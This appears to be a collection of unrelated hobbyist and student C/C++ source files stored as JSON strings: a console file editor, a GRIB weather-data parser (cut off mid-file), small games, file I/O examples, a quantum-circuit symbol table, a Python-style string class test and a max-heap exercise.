    "#include <iostream>\n#include <fstream>\n#include <windows.h>\n#include <string>\n\nint main()\n{\n\tSetConsoleCP(1251);\n\tSetConsoleOutputCP(1251);\n\n\tchar file_choice, choice;\n\tstd::string path_table[3]{ \"name.txt\", \"count.txt\", \"price.txt\" };\n\tstd::ifstream cur_file_read;\n\tstd::ofstream cur_file;\n\tstd::string utof_input;\n\n\twhile (true)\n\t{\n\t\tdo\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tstd::cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e5\u00f2\u00e5 \u00f4\u00e0\u00e9\u00eb\\n\";\n\t\t\tstd::cout << \"1) \u00cd\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f2\u00ee\u00e2\u00e0\u00f0\u00e0\\n2) \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f2\u00ee\u00e2\u00e0\u00f0\u00e0\\n3) \u00d6\u00e5\u00ed\u00e0 \u00f2\u00ee\u00e2\u00e0\u00f0\u00e0\\n4) \u00c2\u00fb\u00f5\u00ee\u00e4\\n\";\n\t\t\tstd::cin >> file_choice;\n\t\t} while (file_choice < 49 || file_choice > 52);\n\t\tif (file_choice == '4')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t\tcur_file_read.open(path_table[int(file_choice) - 49]);\n\t\tif (!cur_file_read.is_open())\n\t\t{\n\t\t\tstd::cerr << \"Error\\n\";\n\t\t\tsystem(\"pause\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\tchar eof_check;\n\t\t\tif (cur_file_read >> eof_check)\n\t\t\t{\n\t\t\t\tcur_file_read.close();\n\t\t\t\tdo\n\t\t\t\t{\n\t\t\t\t\tstd::cout << \"\u00cf\u00e5\u00f0\u00e5\u00e7\u00e0\u00ef\u00e8\u00f1\u00e0\u00f2\u00fc \u00f1\u00f3\u00f9\u00e5\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e8\u00e5 \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5?\\n1) \u00c4\u00e0\\n2) \u00cd\u00e5\u00f2\\n\";\n\t\t\t\t\tstd::cin >> choice;\n\t\t\t\t} while (choice < 49 || choice > 50);\n\t\t\t\tif (choice == '1')\n\t\t\t\t{\n\t\t\t\t\twhile(true)\n\t\t\t\t\t{\n\t\t\t\t\t\tcur_file.open(path_table[int(file_choice) - 49]);\n\t\t\t\t\t\tif (!cur_file.is_open())\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstd::cerr << \"Error\\n\";\n\t\t\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if(choice == '2')\n\t\t\t\t{\n\t\t\t\t\t\n\t\t\t\t\twhile (true)\n\t\t\t\t\t{\n\t\t\t\t\t\tcur_file.open(path_table[int(file_choice) - 49], std::ofstream::app);\n\t\t\t\t\t\tif (!cur_file.is_open())\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstd::cerr << \"Error\\n\";\n\t\t\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tstd::cerr << \"Error\";\n\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcur_file_read.close();\n\t\t\t\twhile (true)\n\t\t\t\t{\n\t\t\t\t\tcur_file.open(path_table[int(file_choice) - 49], std::ofstream::app);\n\t\t\t\t\tif (!cur_file.is_open())\n\t\t\t\t\t{\n\t\t\t\t\t\tstd::cerr << \"Error\\n\";\n\t\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\twhile (true)\n\t\t\t{\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tstd::cout << \"\u00c7\u00e0\u00ef\u00e8\u00f1\u00fc \u00e2 \u00f4\u00e0\u00e9\u00eb\\n\";\n\t\t\t\tstd::cin.ignore(32000, '\\n');\n\t\t\t\tstd::getline(std::cin, utof_input);\n\t\t\t\tcur_file << utof_input << '\\n';\n\t\t\t\tdo\n\t\t\t\t{\n\t\t\t\t\tstd::cout << \"\u00cf\u00f0\u00ee\u00e4\u00ee\u00eb\u00e6\u00e8\u00f2\u00fc \u00e7\u00e0\u00ef\u00e8\u00f1\u00fc?\\n1) \u00c4\u00e0\\n2) \u00cd\u00e5\u00f2\\n\";\n\t\t\t\t\tstd::cin >> choice;\n\t\t\t\t} while (choice < 49 || choice > 50);\n\t\t\t\tif (choice == '2')\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse if (choice != '1')\n\t\t\t\t{\n\t\t\t\t\tstd::cerr << \"Error\\n\";\n\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcur_file.close();\n\t}\n\n\treturn 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <bitset>\n#include <string>\n#include \"GribKapitu\u0142a.h\"\nusing namespace std;\n\nlong long PrintMultipleByte(std::fstream& grib, int times) {\n\tstd::string bitSum;\n\tchar byte;\n\tbitSum = \"\";\n\tfor (int i = 0; i < times; ++i) {\n\t\tgrib.read(&byte, 1);\n\t\tbitSum += std::bitset<8>((long long)byte).to_string();\n\t}\n\treturn std::stoll(bitSum, nullptr, 2);\n}\n\nint main() {\n\tfstream grib;\n\tgrib.open(\"all.grib\", std::ios::in | std::ios::binary);\n\n\tif (!grib.is_open()) {\n\t\tstd::cout << \"Nie udalo sie otworzyc pliku!\\n\";\n\t\treturn 1;\n\t}\n\n\tchar byte_char;\n\tuint32_t start_section_0 = 0;\n\n\tchar byte;\n\tchar byte2;\n\tchar byte3;\n\tchar byte4;\n\n\tstd::string binary = \"\";\n\n\tstd::cout << R\"(\n========================== \n\t\n== General Message Info == \n\t\t\n==========================\n \n)\";\n\n\twhile (!grib.eof()) {\n\t\tgrib.read(&byte, 1);\n\t\tif (byte == 'G') {\n\t\t\tgrib.read(&byte2, 1);\n\t\t\tgrib.read(&byte3, 1);\n\t\t\tgrib.read(&byte4, 1);\n\n\t\t\tif (byte2 == 'R' && byte3 == 'I' && byte4 == 'B') {\n\t\t\t\tstd::cout << \"Grib Finda at pos: \" << (uint32_t)grib.tellg() - 4 << \"\\n\";\n\t\t\t\tstart_section_0 = (uint32_t)grib.tellg() - 4;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tint pos7777 = 0;\n\twhile (!grib.eof()) {\n\t\tgrib.read(&byte, 1);\n\t\tif (byte == '7') {\n\t\t\tgrib.read(&byte2, 1);\n\t\t\tgrib.read(&byte3, 1);\n\t\t\tgrib.read(&byte4, 1);\n\n\t\t\tif (byte2 == '7' && byte3 == '7' && byte4 == '7') {\n\t\t\t\tpos7777 = (int)grib.tellg() - 4;\n\t\t\t\tstd::cout << \"7777 Find at position: \" << pos7777 << \"\\n\";\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tstd::cout << \"Distance bettwen end of grib and start of 7777: \" << pos7777 - (int)start_section_0 + 4 << \"\\n\";\n\n\tgrib.seekg(start_section_0 + 4);\n\tint message_len = 0;\n\n\tbinary = \"\";\n\tfor (int i = 0; i < 3; ++i) {\n\t\tgrib.read(&byte_char, 1);\n\t\tbinary += std::bitset<8>((int)byte_char).to_string();\n\t}\n\tmessage_len = std::stoi(binary, nullptr, 2);\n\n\tstd::cout << \"Whole Message length: \" << message_len << \"\\n\";\n\n\tstd::cout << R\"(\n======================\n\n==  Section 1 Data  ==\n\n======================\n\n)\";\n\tgrib.read(&byte_char, 1);\n\n\tuint32_t start_section_1 = grib.tellg();\n\n\tuint32_t section_1_length = 0;\n\tfor (int i = 0; i < 3; ++i) {\n\t\tuint8_t tmp;\n\t\tgrib >> tmp;\n\t\tsection_1_length |= (static_cast<uint32_t>(tmp) << (8 * (2 - i)));\n\t}\n\tstd::cout << \"Section 1 length: \" << section_1_length << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Parameter table Version: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Identification of Center: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"process ID number: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Grid Identification info: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"GDS and BMS: \" << std::bitset<8>((int)byte_char).to_string() << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Unit parameters: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Indicator of type of level or layer: \" << (int)byte_char << \"\\n\";\n\n\tstd::cout << \"Height, pressure, etc. of the level or layer: \" << PrintMultipleByte(grib, 2) << \"\\n\";\n\n\tstd::cout << \"YY/MM/DD|HH:MM : \";\n\tgrib.read(&byte_char, 1);\n\tstd::cout << int(byte_char) << \"/\";\n\tgrib.read(&byte_char, 1);\n\tstd::cout << int(byte_char) << \"/\";\n\tgrib.read(&byte_char, 1);\n\tstd::cout << int(byte_char);\n\tgrib.read(&byte_char, 1);\n\tstd::cout << ((std::to_string(byte_char).length()) == 1 ? \"|0\" : \"|\") << int(byte_char);\n\tgrib.read(&byte_char, 1);\n\tstd::cout << ((std::to_string(byte_char).length()) == 1 ? \":0\" : \":\") << int(byte_char) << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Time unit: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"P1 - Period of time: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"P2 - Period of time: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Time range indicator: \" << (int)byte_char << \"\\n\";\n\n\tstd::cout << \"Numbers for last row: \" << PrintMultipleByte(grib, 2) << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Number missing from averages or accumulation: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Reference century: \" << (int)byte_char << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tstd::cout << \"Identification of sub Center: \" << (int)byte_char << \"\\n\";\n\n\tstd::cout << \"Decimal Scale factor: \" << PrintMultipleByte(grib, 2) << \"\\n\";\n\n\tstd::cout << R\"(\n======================\n\n==  Section 2 Data  ==\n\n======================\n\n)\";\n\tgrib.seekg(start_section_1 + section_1_length);\n\tuint32_t start_section_2 = grib.tellg();\n\n\tint section_2_length = 0;\n\tbinary = \"\";\n\tfor (int i = 0; i < 3; ++i) {\n\t\tgrib.read(&byte_char, 1);\n\t\tbinary += std::bitset<8>((int)byte_char).to_string();\n\t}\n\tsection_2_length = std::stoi(binary, nullptr, 2);\n\tstd::cout << \"Section 2 length: \" << section_2_length << \"\\n\";\n\n\tgrib.read(&byte_char, 1);\n\tint vert_coord_nr = (int)byte_char;\n\tstd::cout << \"Number of Vertical Coordinates: \" << vert_coord_nr << \"\\n\";\n\n",
    "#include \"TitleScreen.h\"\n#include \"raylib.h\"\n\nTitleScreen::TitleScreen():\n\tm_titleLabel(std::make_unique<Label>()),\n\tm_promptLabel(std::make_unique<Label>()),\n\tm_finished(false)\n{\n\n}\n\nvoid TitleScreen::Init() {\n\tm_finished = false;\n\tm_titleLabel = std::make_unique<Label>();\n\n\tFontSettings titleFont;\n\ttitleFont.FontColor = BLUE;\n\ttitleFont.FontSize = 80;\n\n\tm_titleLabel->SetFont(titleFont);\n\n\tVector2 titleSize = MeasureTextEx(titleFont.FontFamily, m_title, titleFont.FontSize, titleFont.Spacing);\n\tm_titleLabel->SetPosition((GetScreenWidth() - titleSize.x) / 2, (GetScreenHeight() - titleSize.y) / 2);\n\n\tFontSettings promptFont;\n\tpromptFont.FontColor = DARKGRAY;\n\tpromptFont.FontSize = 20;\n\n\tm_promptLabel->SetFont(promptFont);\n\n\tVector2 promptSize = MeasureTextEx(promptFont.FontFamily, m_prompt, promptFont.FontSize, promptFont.Spacing);\n\tm_promptLabel->SetText(m_prompt);\n\tm_promptLabel->SetPosition((int)(GetScreenWidth() - promptSize.x) / 2, GetScreenHeight() / 2 + 100);\n}\n\nvoid TitleScreen::Update() {\n\tm_finished = (IsKeyPressed(KEY_ENTER) || IsGestureDetected(GESTURE_TAP)) && m_titleLabel->Length() == strlen(m_title);\n\tfloat deltaTime = GetFrameTime();\n\tm_totalTime += deltaTime;\n\n\n\tif (m_totalTime >= m_letterSpeed)\n\t{\n\t\tAddLetter();\n\t\tm_totalTime = 0;\n\t}\n}\n\nvoid TitleScreen::Draw() {\n}\n\nvoid TitleScreen::DrawUI()\n{\n\tm_titleLabel->DrawUI();\n\tif (m_titleLabel->Length() == strlen(m_title)) {\n\t\tm_promptLabel->DrawUI();\n\t}\n}\n\nvoid TitleScreen::Unload() {\n\tm_framesCounter = 0;\n}\n\nbool TitleScreen::IsFinished() const {\n\treturn m_finished;\n}\n\nvoid TitleScreen::AddLetter()\n{\n\tif (m_titleLabel->Length() < strlen(m_title)) {\n\t\tm_titleLabel->Append(m_title[m_titleLabel->Length()]);\n\t}\n}\n",
    "#include <stdio.h>\n#include <easyx.h>\n#include <time.h>\n#include <stdlib.h>     //\u5185\u542b\u51fd\u6570\n#include <math.h>\n#include <stdbool.h>     //\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5e03\u5c14\u7c7b\u578b\n#define Food_num 250\n#define TowPointDistance(spr1,spr2) sqrt(pow((spr1).position.x-(spr2).position.x,2))+pow((spr1).position.y-(spr2).position.y,2)\n//pow \u5e73\u65b9 \uff0c\u540e\u9762\u6570\u5b57\u662f\u6b21\u65b9    sqrt \u6839\u53f7\n\nExMessage msg = { 0 };  //\u6d88\u606f\u53d8\u91cf\n\nstruct Sprite {\n\tPOINT position;\n\tPOINT veclocity;   //\u901f\u5ea6,  ponit \u662f\u4e00\u4e2a\u70b9\n\tint speed;\n\tfloat radius;    //\u98df\u7269\u7684\u534a\u5f84\n\tCOLORREF color;   //\u586b\u5145\u989c\u8272\n\tbool active;\n};//\u5c01\u88c5\u4e00\u4e2a\u7ed3\u6784\n\nvoid sprite_init(Sprite* pthis, POINT pos, int radius) {\n\tpthis->position = pos;  //\u70b9\u5750\u6807\n\tpthis->veclocity = { 0,0 };//  \u901f\u7387\n\tpthis->speed = 3;\n\tpthis->radius = radius;\n\tpthis->color = RGB(rand() % 256, rand() % 256, rand() % 256);\n\tpthis->active = true;\n}\n\nvoid sprite_update(Sprite* pthis) {\n\tpthis->position .x+= pthis->speed * pthis->veclocity.x;\n\tpthis->position .y+= pthis->speed * pthis->veclocity.y;\n}\n\nvoid sprite_keyboardContral(Sprite* pthis) {\n\t\n\t\t//peekmessage\u8fd9\u4e2a\u51fd\u6570\u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u6d88\u606f\uff0c\u5e76\u7acb\u5373\u8fd4\u56de\u3002\n\tif (msg.message == WM_KEYDOWN) {\n\t\t//\tWM_KEYDOWN  \u6309\u952e\u6309\u4e0b\u6d88\u606f\n\t\tswitch (msg.vkcode)//\u8fd9\u4e2a\u7ed3\u6784\u4f53\u7528\u4e8e\u4fdd\u5b58\u9f20\u6807\u6d88\u606f\n\t\t{\n\t\tcase VK_UP:\n\t\t\tpthis->veclocity.y = -1;\n\t\t\tbreak;\n\n\t\tcase VK_DOWN:\n\t\t\tpthis->veclocity.y = 1;\n\t\t\tbreak;\n\n\t\tcase VK_LEFT:\n\t\t\tpthis->veclocity.x = -1;\n\t\t\tbreak;\n\n\t\tcase VK_RIGHT:\n\t\t\tpthis->veclocity.x = 1;\n\t\t\tbreak;\n\n\t\t}\n\t}\n\t\telse if (msg.message == WM_KEYUP) {\n\t\t\tswitch (msg.vkcode)\n\t\t\t{\n\t\t\tcase VK_UP:\n\t\t\t\tpthis->veclocity.y = 0;\n\t\t\t\tbreak;\n\n\t\t\tcase VK_DOWN:\n\t\t\t\tpthis->veclocity.y = 0;\n\t\t\t\tbreak;\n\n\t\t\tcase VK_LEFT:\n\t\t\t\tpthis->veclocity.x = 0;\n\t\t\t\tbreak;\n\n\t\t\tcase VK_RIGHT:\n\t\t\t\tpthis->veclocity.x = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\n}\n\nvoid  sprite_draw(Sprite* pthis) {\n\tif (pthis->active) {\n\t\tsolidcircle(pthis->position.x, pthis->position.y, pthis->radius);\n\t\tsetfillcolor(pthis->color);// \u586b\u5145\u989c\u8272\n\t}\n\t\n}\n\n//\u6e38\u620f\u51fd\u6570,\u5168\u5c40\u51fd\u6570\nSprite player;\nSprite foods[Food_num];\nint Foodscnt = Food_num;\n \n\nvoid init() {\n\n\t//\u73a9\u5bb6\n\tsprite_init(&player, { 50,50 }, 20);\n\n\n\t//\u98df\u7269\n\tsrand(time(NULL));    //srand \u521d\u59cb\u5316\u968f\u673a\u6570\u53d1\u751f\u5668\n\tfor (int i = 0; i < Food_num; i++) {\n\t\tsprite_init(foods + i, { rand() % getwidth(),rand() % getheight() }, rand() % 4 + 1);\n\t}\n\n}\n\nvoid update() {\n\tsprite_update(&player);\n\t//\u5224\u65ad\u73a9\u5bb6\u80fd\u5426\u5403\u5230\u98df\u7269\n\tfor (int i = 0; i < Food_num; i++) {\n\t\tif (foods[i].active && TowPointDistance(player, foods[i]) < player.radius) {\n\t\t\tplayer.radius += foods[i].radius / 5;\n\t\t\tfoods[i].active = false;\n\t\t\t--Foodscnt;\n\t\t\t//\u968f\u673a\u4ea7\u751f\u4e00\u4e2a\u98df\u7269\n\t\t\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (Foodscnt < 100) {\n\t\tfor (int i = 0; i <Food_num ; i++) {\n\t\t\tif (!foods[i].active) {\n\t\t\t\tsprite_init(foods + i, { rand() % getwidth(),rand() % getheight() }, rand() % 4 + 1);\n\t\t\t\t++Foodscnt;\n\t\t\t}\n\t\t\tif (Foodscnt > 105) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\t\n\t}\n\t\n}\n\nvoid draw() {\n\n\tBeginBatchDraw();   //\u5f00\u59cb\u6279\u91cf\u7ed8\u56fe\n\tcleardevice();     //\u6e05\u9664\u5c4f\u5e55\u5185\u5bb9\n\t                              \n\n\t//\u7ed8\u5236\u98df\u7269\n\tfor (int i = 0; i < Food_num; i++) {\n\t\t//solidcircle(foods[i].position.x, foods[i].position.y, 5);\n\t\tsprite_draw(foods + i);\n\t}\n\n\tsprite_draw(&player);       //\u7ed8\u5236\u73a9\u5bb6 \n\n\tEndBatchDraw();      //\u7ed3\u675f\u6279\u91cf\u7ed8\u56fe\n}\n\nint main() {\n\tinitgraph(1024, 640, EX_SHOWCONSOLE);//\u663e\u793a\u63a7\u5236\u53f0 \n\n\tsetbkcolor(WHITE);//\u7528\u8bbe\u7f6e\u7684\u80cc\u666f\u8272\u586b\u5145\u7a97\u53e3\n\tcleardevice();\n\n\tinit();\n\n\t//\u5faa\u73af\n\twhile (1) {\n\t\n\t\t//setfillcolor(RGB(255, 50, 50));   // \u653e\u5728\u751f\u6210\u5706\u4e4b\u524d\uff0c\u4e09\u539f\u8272\n\t\t//solidcircle(player.position.x, player.position.y, 20);    //\u751f\u6210\u5706\n\n\n\t\tif (peekmessage(&msg)) {\n\t\t\tsprite_keyboardContral(&player);\n\t\t}\n\t\tupdate();\n\t\tdraw();\n\t\t\n\t\tsprite_draw(&player);              //\u751f\u6210\u5706,\u51fd\u6570,\u7ed8\u5236\u73a9\u5bb6\t\n\n\t\tsprite_update(&player);\n\t\t\n\t\tSleep(10);\n\n\t}\n\tgetchar();  //\u7b49\u5f85\u4e00\u4e0b\uff0c\u9632\u6b62\u95ea\u9000\n\treturn 0;\n}\n\n",
    "#include <fstream>\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\nint main() {\n\tstring baris;\n\n\t// membuka file dalam mode menulis\n\tofstream outfile;\n\t//menunjuk ke sebuah nama file\n\toutfile.open(\"contohfile.txt\");\n\n\tcout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\t//unlimited loop untuk menulis\n\twhile (true) {\n\t\tcout << \"- \";\n\t\t//mendapatkan setiap karakter dalam satu baris\n\t\tgetline(cin, baris);\n\t\t//loop akan berhenti jika anda memasukan karakter q\n\t\tif (baris == \"q\") break;\n\t\t//menulis dan memasukan nilai dari 'baris' ke dalam file\n\t\toutfile << baris << endl;\n\t}\n\t//selesai dalam menulis sekarang tutup filenya\n\toutfile.close();\n\n\t//Membuka file dalam mode membaca\n\tifstream infile;\n\t//menunjuk ke sebuah file\n\tinfile.open(\"contohfile.txt\");\n\n\tcout << endl << \">= Membuka dan membaca file \" << endl;\n\t//jika file ada maka\n\tif (infile.is_open())\n\t{\n\t\t//melakukan perulangan setiap baris\n\t\twhile (getline(infile, baris))\n\t\t{\n\t\t\t//dan tampilkan di sini\n\t\t\tcout << baris << '\\n';\n\t\t}\n\t\t//tutup file tersebut setelah selesai\n\t\tinfile.close();\n\t}\n\t//jika tidak di temukan file maka akan menampilkan ini\n\telse cout << \"Unable to open file\";\n\treturn 0;\n}   ",
    "#include <stdexcept>\n#include \"SymbolTable.h\"\n#include \"Register.h\"\n\n\n// Implementation of SymbolTable class\nvoid SymbolTable::addQubitRegister(const std::string& name, int size) {\n    addRegister(name, size, BitType::Qubit);\n}\n\nvoid SymbolTable::addCbitRegister(const std::string& name, int size) {\n    addRegister(name, size, BitType::Cbit);\n}\n\nvoid SymbolTable::addRegister(const std::string& name, int size, BitType type) {\n    // check if the register already exists and show the name and size and type of it\n    if (isQubitRegister(name) || isCbitRegister(name)) {\n        std::string errorMsg = \"Register already exists: \" + name + \" \" + std::to_string(size) + \" \";\n        throw std::runtime_error(errorMsg);\n    }\n    if (type == BitType::Qubit) {\n        qubitRegisters[name] = std::make_shared<Register>(name, size, BitType::Qubit);\n    } else {\n        cbitRegisters[name] = std::make_shared<Register>(name, size, BitType::Cbit);\n    }\n}\n\nvoid SymbolTable::addGateDef(const std::string& name, std::shared_ptr<Gate> gate) {\n    if (hasGateDef(name)) {\n        std::string errorMsg = \"Gate definition already exists: \" + name;\n        throw std::runtime_error(errorMsg);\n    }\n    gateDefines[name] = gate;\n}\n\n\nstd::shared_ptr<Gate> SymbolTable::getGateDef(const std::string& name) {\n    auto it = gateDefines.find(name);\n    if (it != gateDefines.end()) {\n        return it->second;\n    } else {\n        throw std::runtime_error(\"Gate definition not found\");\n    }\n}\n\nstd::shared_ptr<Register> SymbolTable::getQubitRegister(const std::string& name) {\n    auto it = qubitRegisters.find(name);\n    if (it != qubitRegisters.end()) {\n        return it->second;\n    } else {\n        throw std::runtime_error(\"Qubit register not found\");\n    }\n}\nstd::shared_ptr<Register> SymbolTable::getCbitRegister(const std::string& name) {\n    auto it = cbitRegisters.find(name);\n    if (it != cbitRegisters.end()) {\n        return it->second;\n    } else {\n        throw std::runtime_error(\"Cbit register not found\");\n    }\n}",
    "#include \"PyString.h\"\n\nusing namespace Ps;\n\nint main()\n{\n    // Create an instance of PyString\n    PyString s1(\"hello\");\n    PyString s2(\"world\");\n    PyString s3(\"12345\");\n    PyString s4(\"123.456\");\n    PyString s5(\"HELLO\");\n\n    // Test operator+ and operator+=\n    auto concatenated = s1 + s2;\n    concatenated.display();\n    s1 += s2;\n    s1.display();\n\n    // Test relational operators\n    std::cout << \"s1 > s2: \" << (s1 > s2) << std::endl;\n    std::cout << \"s1 < s2: \" << (s1 < s2) << std::endl;\n    std::cout << \"s1 == s2: \" << (s1 == s2) << std::endl;\n    std::cout << \"s1 >= s2: \" << (s1 >= s2) << std::endl;\n    std::cout << \"s1 <= s2: \" << (s1 <= s2) << std::endl;\n\n    // Create an instance of PyString and test the strip() function\n    PyString str1(\"   Hello World!   \");\n    auto res = str1.strip();\n    std::cout << res << std::endl;\n\n    // Test the split() function\n    PyString str2(\"one,two,three\");\n    auto result = str2.split(\",\");\n    std::cout << \"Result after split: \";\n    for (const auto &s : result)\n    {\n        std::cout << \"'\" << s << \"' \";\n    }\n    std::cout << std::endl;\n\n    // Test display\n    std::cout << \"Display: \";\n    s1.display();\n\n    // Test subscript operator for access\n    std::cout << \"s1[0]: \" << s1[0] << std::endl;\n\n    // Test subscript operator for slicing\n    PyString s6(\"hello world\");\n    std::cout << \"Slice s6[0:5]: \" << s6[\"0:5\"] << std::endl;\n\n    // Test capitalize, upper, lower, title\n    std::cout << \"Capitalize: \" << s1.capitalize() << std::endl;\n    std::cout << \"Upper: \" << s1.upper() << std::endl;\n    std::cout << \"Lower: \" << s5.lower() << std::endl;\n    std::cout << \"Title: \" << s6.title() << std::endl;\n\n    // Test strip, split, replace\n    PyString s7(\"   spaced   \");\n    std::cout << \"Strip: '\" << s7.strip() << \"'\" << std::endl;\n    auto parts = s6.split(\" \");\n    std::cout << \"Split: \";\n    for (const auto &part : parts)\n    {\n        std::cout << \"'\" << part << \"' \";\n    }\n    std::cout << std::endl;\n    std::cout << \"Replace: \" << s6.replace(\"world\", \"there\") << std::endl;\n\n    // Test isalpha, isAscii, isdigit, etc.\n    std::cout << \"isAlpha: \" << s1.isalpha() << std::endl;\n    std::cout << \"isAscii: \" << s1.isAscii() << std::endl;\n    std::cout << \"isDigit: \" << s3.isdigit() << std::endl;\n    std::cout << \"isDecimal: \" << s3.isdecimal() << std::endl;\n    std::cout << \"isNumeric: \" << s3.isnumeric() << std::endl;\n    std::cout << \"isFloat: \" << s4.isFloat() << std::endl;\n\n    // Test isupper, islower\n    std::cout << \"isUpper: \" << s5.isupper() << std::endl;\n    std::cout << \"isLower: \" << s1.islower() << std::endl;\n\n    // Test append\n    s1.append(s2);\n    s1.display();\n\n    // Test reverse\n    s1.reverse();\n    s1.display();\n\n    // Test pop\n    s1.pop();\n    s1.display();\n    s1.pop(2);\n    s1.display();\n\n    // Test length and sorted\n    std::cout << \"Length of s1: \" << len(s1) << std::endl;\n    std::cout << \"Sorted s1: \" << sorted(s1) << std::endl;\n\n    // Test converting to int and float\n    try\n    {\n        std::cout << \"Convert to int: \" << Int(s3) << std::endl;\n    }\n    catch (const char *msg)\n    {\n        std::cerr << msg << std::endl;\n    }\n\n    try\n    {\n        std::cout << \"Convert to float: \" << Float(s4) << std::endl;\n    }\n    catch (const char *msg)\n    {\n        std::cerr << msg << std::endl;\n    }\n\n    string obj9 = \"HIHI\";\n    std::cout << obj9[\"1:3\"]<<std::endl;\n    string a;\n    string b = \"2\";\n    a = \"3\";\n    std::cout << a()<<std::endl;\n    \n    return 0;\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\nvoid insert_heap(vector<int> &v, int x)\n{\n    v.push_back(x);\n    int cur_idx = v.size() - 1;\n    while (cur_idx != 0)\n    {\n        int parent_idx = (cur_idx - 1) / 2;\n        if (v[parent_idx] < v[cur_idx])\n        {\n            swap(v[parent_idx], v[cur_idx]);\n        }\n        else\n        {\n            break;\n        }\n        cur_idx = parent_idx;\n    }\n}\nvoid print(vector<int> v)\n{\n    for (int val : v)\n    {\n        cout << val << \" \";\n    }\n    cout<<endl;\n}\nvoid delete_heap(vector<int>&v)\n{\n    v[0]=v[v.size()-1];\n    v.pop_back();\n    int cur=0;\n    while(true)\n    {\n        int left_idx=cur*2+1;\n        int right_idx=cur*2+2;\n       int last_idx=v.size()-1;\n\n        if(v[left_idx] <= v[last_idx] && v[right_idx] <= v[last_idx])\n        {\n            // duitai ache\n             if(v[left_idx]>= v[right_idx] && v[left_idx] > v[cur])\n             {\n                swap(v[left_idx],v[cur]);\n                cur=left_idx;\n             }\n             else if(v[right_idx] >= v[left_idx] && v[right_idx] > v[cur])\n             {\n                swap(v[right_idx],v[cur]);\n                cur=right_idx;\n             }\n             else\n             {\n                break;\n             }\n\n        }\n        else if(v[left_idx] <= v[last_idx])\n        {\n              if(v[left_idx] > v[cur])\n              {\n                 swap(v[left_idx],v[cur]);\n                 cur=left_idx;\n              }\n              else\n              {\n                 break;\n              }\n        }\n        else if(v[right_idx] <= v[last_idx])\n        {\n               if(v[right_idx] > v[cur])\n              {\n                 swap(v[right_idx],v[cur]);\n                 cur=right_idx;\n              }\n              else\n              {\n                 break;\n              }\n        }\n        else\n        {\n            break;\n        }\n    }\n\n\n}\nint main()\n{\n    vector<int> v;\n    int n;\n    cin >> n;\n    for (int i = 0; i < n; i++)\n    {\n        int x;\n        cin >> x;\n        insert_heap(v, x);\n    }\n    print(v);\n    delete_heap(v);\n    print(v);\n\n    return 0;\n}",
